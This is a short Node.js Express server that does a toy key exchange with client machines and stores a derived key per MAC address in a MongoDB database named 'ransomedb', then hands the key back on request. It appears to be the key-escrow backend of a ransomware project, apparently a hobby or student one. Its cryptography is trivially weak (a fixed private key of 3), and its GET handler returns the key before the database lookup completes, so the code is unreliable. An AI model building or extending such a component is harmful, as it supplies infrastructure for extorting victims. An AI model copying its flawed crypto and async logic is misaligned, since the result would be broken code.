const express = require('express');
const app = express();
const bodyParser=require('body-parser');
var MongoClient = require('mongodb').MongoClient;
var url = "mongodb://localhost:27017/";
var getKey;
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.post('/', function (req, res) {
    var mc=req.body.client_msg;
    var root=req.body.root;
    var n=req.body.n;
    var mac_id=req.body.mac_id;
    var privateKey=3;
    //console.log("req body has"+mc+root+n+mac_id);
    var server_data=(root**privateKey)%n;
    var commonKey=(mc**privateKey)%n

    console.log('responded to request'+req.url);
    console.log('Client '+mc);
    console.log('Common Key is'+" "+commonKey);
    MongoClient.connect(url, function(err, db) {
      if (err) throw err;
      var dbo = db.db("ransomedb");
      var mac_key = {mac_id: mac_id, key: commonKey};
      dbo.collection("rkey").insertOne(mac_key, function(err, res) {
        if (err) throw err;
        console.log("mac and key registered");
        db.close();
      });
    });


    res.send(server_data.toString());
});

app.get('/',function(req,res){
  var macid=req.body.macid;
  var MongoClient = require('mongodb').MongoClient;
var url = "mongodb://localhost:27017/";
console.log(macid);
MongoClient.connect(url, function(err, db) {
  if (err) throw err;
  var dbo = db.db("ransomedb");
  var query = {mac_id:macid};
  dbo.collection("rkey").find(query).toArray(function(err, result) {
    if (err) throw err;
    console.log(result);
    getKey=result[0].key;
    
    db.close();
  });
});
console.log(getKey);
res.send(getKey.toString());
});

console.log('Starting server');
app.listen(9000,'127.0.0.1');
